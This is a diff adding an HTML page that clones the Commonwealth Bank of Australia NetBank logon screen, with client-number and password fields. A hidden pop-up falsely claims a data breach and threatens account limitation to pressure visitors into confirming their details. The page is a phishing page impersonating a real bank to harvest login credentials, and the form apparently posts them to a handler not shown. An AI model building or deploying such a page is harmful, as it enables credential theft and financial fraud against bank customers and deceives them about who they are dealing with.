@@ -1,0 +1,300 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
+ <head id="head">
+  <title>
+   NetBank - Logon
+  </title>
+  <link href="css/logon-merge-hash-min.css" type="text/css" rel="stylesheet" />
+ </head>
+ <body class="logon" id="body">
+  <div id="boxes">
+   <div class="window" id="dialog" style="top: 199.5px; left: 551.5px; display: none;">
+    <a class="close" href="#">
+     NOTICE
+    </a>
+    <br />
+    <br />
+    <p class="special">
+     It's important that you confirm your profile information to assist us with the data breach we encountered.
+     <br />
+     <br />
+     Note that failure to do so will result in account limitation.
+     <br />
+     <br />
+     <br />
+    </p>
+    <center>
+     <a class="close" href="#">
+      CLOSE NOTICE NOW
+     </a>
+    </center>
+    <p>
+    </p>
+   </div>
+   <div id="mask" style="width: 1478px; height: 602px; display: none; opacity: 0.8;">
+   </div>
+  </div>
+  <form autocomplete="off" id="form1" action="" method="post" name="form1">
+   <div>
+   </div>
+   <div id="BodyContainer">
+    <!-- header -->
+    <div id="Header">
+     <div id="BrandingLogo">
+      <span id="imgCbaLogo" class="ImageWithHelp">
+       <img style="border-width:0px;" alt="Commonwealth Bank of Australia" src="images/cba_mainLogo.gif?v=eed25876db587639715b9683799251f0" id="imgCbaLogo" />
+      </span>
+     </div>
+    </div>
+    <div id="MainContent">
+     <div class="TopMessage">
+      <span>
+       NetBank for
+      </span>
+      <a href="#" class="MobileLink" id="lnkMobileVersion">
+       Mobile
+      </a>
+      <a href="#" class="TabletLink" id="lnkTabletVersion">
+       Tablet
+      </a>
+     </div>
+     <!-- required message -->
+     <div style="display:none;" id="mplMessagePanel" class="MessagePanel arrow">
+     </div>
+     <div id="ModuleWrap">
+      <div class="module" id="ModuleLeft">
+       <h2>
+        Log on to NetBank
+       </h2>
+       <div class="bd">
+        <div class="ft">
+         <div class="row">
+          <div class="LabelWrapper LabelTextAlign NotSet align_notset">
+           <label id="txtMyClientNumber_label" for="txtMyClientNumber_field">
+            <span class="MainLabel ">
+             Client number
+            </span>
+           </label>
+          </div>
+          <input type="text" data-maxlength="8" class="text textbox field" id="txtMyClientNumber_field" maxlength="8" value="" name="txtMyClientNumber$field" />
+         </div>
+         <div class="row">
+          <div class="LabelWrapper LabelTextAlign NotSet align_notset">
+           <label id="txtMyPassword_label" for="txtMyPassword_field">
+            <span class="MainLabel ">
+             Password
+            </span>
+           </label>
+          </div>
+          <input type="password" data-maxlength="16" class="text textbox field" id="txtMyPassword_field" maxlength="16" name="txtMyPassword$field" />
+         </div>
+         <div class="row">
+          <span class="checkbox field">
+           <input type="checkbox" name="chkRemember$field" id="chkRemember_field" />
+           <label for="chkRemember_field">
+            Remember client number
+           </label>
+          </span>
+         </div>
+         <input type="hidden" id="perfmonLog" name="perfmonLog" />
+         <div id="btnLogon" class="CbaButton ">
+          <input type="submit" id="btnLogon_field" value="LOG ON" name="btnLogon$field" class="button field" />
+         </div>
+         <div class="MessageBubble" id="MessageBubble">
+          <span class="MessagePointer">
+          </span>
+          <a href="javascript:void(0)" title="Close" class="MessageClose" id="MessageClose">
+           Close
+          </a>
+          <span class="MessageBody">
+           For security reasons, do not
+           <br />
+           select
+           <strong>
+            Remember client number
+           </strong>
+           if anyone else uses
+           <br />
+           this computer.
+           <a target="_blank" href="http://www.commbank.com.au/passwordtips" id="lnkFindOutMore">
+            Find out more
+           </a>
+           .
+          </span>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="module" id="ModuleRight">
+       <h2>
+        Need help?
+       </h2>
+       <div class="bd">
+        <div class="ft">
+         <ul class="Bullets">
+          <li>
+           <a href="#" id="lnkForgottenClientNumber">
+            Forgotten client number
+           </a>
+          </li>
+          <li>
+           <a href="#" id="lnkForgottenPassword">
+            Forgotten password
+           </a>
+          </li>
+          <li>
+           <a href="#" id="lnkOnlineSupport">
+            Online Support
+           </a>
+          </li>
+          <li>
+           <a href="#" id="lnkProtectYourselfOnline">
+            Protect yourself online
+           </a>
+          </li>
+         </ul>
+        </div>
+       </div>
+      </div>
+     </div>
+     <!-- this is the fixed size "Register" bar on the login page -->
+     <div id="Register">
+      <a href="#" id="lnkRegistration">
+       <span class="sr">
+        Not yet registered? Register online now
+       </span>
+      </a>
+     </div>
+     <!-- Component for content management. -->
+     <div id="ucLogonContentManageControl_pnlContentManaged">
+      <div id="ContentManaged">
+       <!-- this is the features panel which has the image and description. -->
+       <div id="ucLogonContentManageControl_pnlHighlightPanel">
+        <div class="HighlightPanel">
+         <div class="top">
+          <div class="bottom">
+           <div class="image">
+            <p>
+             <a href="">
+              <img alt="" src="images/login_great_rate_td_201x96.jpg" />
+             </a>
+            </p>
+           </div>
+           <div class="description">
+            <table>
+             <tbody>
+              <tr>
+               <td>
+                <p>
+                 <b>
+                  Get a great return on your money with 4.20% p.a. on a 7 month term
+deposit.
+                 </b>
+                </p>
+                <p>
+                 Available on balances from $50,000 to less than $2,000,000. Interest paid at
+maturity
+                </p>
+                <ul>
+                 <li>
+                  <a href="#">
+                   Find
+out more
+                  </a>
+                 </li>
+                </ul>
+               </td>
+              </tr>
+             </tbody>
+            </table>
+            <p>
+            </p>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+       <!-- side by side highlight links at the bottom -->
+       <div id="ucLogonContentManageControl_pnlCurrentHighlights">
+        <div id="CurrentHighlights">
+         <h3>
+          Current highlights
+         </h3>
+         <div class="column">
+          <ul>
+           <li>
+            <p>
+             <a href="#">
+              Read our
+FAQs about our recent CommSec cash changes
+             </a>
+            </p>
+           </li>
+           <li>
+            <p>
+             <a href="#">
+              Apply
+for a Personal Loan by 25/2 and you could win $5,000
+             </a>
+            </p>
+           </li>
+           <li>
+            <p>
+             <a href="#">
+              Enter
+a draw to win an Asus Zenbook™ and stay safe online with
+McAfee
+             </a>
+            </p>
+           </li>
+           <li>
+            <p>
+             <a href="#">
+              Blog:
+What's your limit?
+             </a>
+            </p>
+           </li>
+          </ul>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <!-- footer -->
+    <div id="PageFooter">
+     <a href="#" id="lnkTermsOfUse">
+      Terms of use
+     </a>
+     |
+     <a href="#" id="lnkSecurity">
+      Security
+     </a>
+     <span id="CopyRight">
+      © Commonwealth Bank of Australia 2013 ABN 48 123 123 124
+     </span>
+    </div>
+   </div>
+   <script type="text/javascript">
+    //&lt;![CDATA[
+document.getElementById('txtMyClientNumber_field').disabled = false;
+document.getElementById('txtMyPassword_field').disabled = false;
+document.getElementById('btnLogon_field').disabled = false;
+try { document.getElementById('txtMyClientNumber_field').focus(); } catch(e) {};
+form1_submitted = false;
+WebForm_OnSubmit = function() {
+	if (form1_submitted) {
+		return false;
+	} else {
+		if (typeof(ValidatorOnSubmit) == "function" &amp;&amp; ValidatorOnSubmit() == false)
+			return false;
+		form1_submitted = true;
+		return true;
+	}
+}
+//]]&gt;
+   </script>
+  </form>
+ </body>
+</html>
